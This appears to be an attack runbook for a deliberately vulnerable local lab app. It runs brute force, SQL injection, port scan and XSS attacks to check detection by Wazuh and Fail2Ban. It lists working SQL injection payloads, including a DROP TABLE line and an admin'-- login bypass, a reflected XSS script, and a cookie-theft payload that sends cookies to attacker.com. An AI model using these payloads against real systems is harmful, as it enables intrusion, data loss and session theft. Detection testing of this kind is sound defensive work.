# SafePipeline — Attack Runbook

> ⚠️ Run these attacks ONLY against `localhost` or an isolated environment you own.

---

## Prerequisites

- App running: `docker run -d -p 5000:5000 safepipeline-app`
- Monitoring running: `cd monitoring/ && docker compose up -d`
- Wazuh running: `cd security/wazuh/ && docker compose up -d`

---

## Attack 1 — Brute Force Login

**Target:** `POST /login`  
**Tool:** hydra or curl  
**Expected detection:** Wazuh rule 100003 + Fail2Ban ban after 5 attempts

```bash
cd security/attacks/
bash brute_force.sh localhost 5000
```

**What happens:**
1. Script sends repeated failed login attempts
2. App logs `login_failed` events to `/var/log/safepipeline/app.log`
3. Wazuh detects 5 failures in 60s → alert level 10
4. Fail2Ban reads the log → bans the source IP for 10 minutes

**Verify in Grafana:** HTTP Request Rate on `POST /login` spikes

---

## Attack 2 — SQL Injection

**Target:** `GET /api/users?id=`  
**Tool:** sqlmap or curl  
**Expected detection:** Wazuh rule 100004 + Fail2Ban ban after 3 attempts

```bash
cd security/attacks/
bash sqli_test.sh localhost 5000
```

**Manual payloads to test in browser:**

| Payload | Effect |
|---|---|
| `/api/users?id=1 OR 1=1` | Returns first user |
| `/api/users?id=0 UNION SELECT 1,username FROM users` | Dumps usernames |
| `/api/users?id=1; DROP TABLE users--` | Table deletion (intentional vuln) |

**Also exploitable on `/login`:**
```
username: admin'--
password: anything
```
This bypasses authentication entirely (SQL comment truncates the query).

---

## Attack 3 — Port Scan

**Target:** Host machine  
**Tool:** nmap  
**Expected detection:** Wazuh IDS alert

```bash
cd security/attacks/
bash portscan.sh localhost
```

**Open ports you will see:**
- `5000` — Flask app
- `9090` — Prometheus
- `3000` — Grafana
- `9200` — Wazuh indexer

---

## Attack 4 — Cross-Site Scripting (XSS)

**Target:** `GET /dashboard?message=`  
**Tool:** browser or curl  
**Expected detection:** Wazuh rule 100005

```bash
cd security/attacks/
bash xss_test.sh localhost 5000
```

**Manual test in browser** (after logging in as admin/admin123):

```
http://localhost:5000/dashboard?message=<script>alert('XSS')</script>
```

A popup will appear — confirming the payload is reflected without sanitization.

**Cookie theft simulation:**
```
http://localhost:5000/dashboard?message=<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

---

## Detection Summary

| Attack | Log event | Wazuh rule | Fail2Ban jail |
|---|---|---|---|
| Brute force | `login_failed` ×5 | 100003 (level 10) | `safepipeline-auth` |
| SQL Injection | `sqli_attempt` | 100004 (level 12) | `safepipeline-sqli` |
| Port Scan | Network traffic | IDS built-in | — |
| XSS | `xss_attempt` | 100005 (level 10) | — |

---

## Checking Fail2Ban status

```bash
# List all jails
sudo fail2ban-client status

# Check brute force jail
sudo fail2ban-client status safepipeline-auth

# Unban an IP manually
sudo fail2ban-client set safepipeline-auth unbanip 127.0.0.1
```

## Checking app logs

```bash
# Follow live
docker exec safepipeline tail -f /var/log/safepipeline/app.log

# Filter security events only
docker exec safepipeline grep -E "login_failed|sqli|xss" /var/log/safepipeline/app.log
```
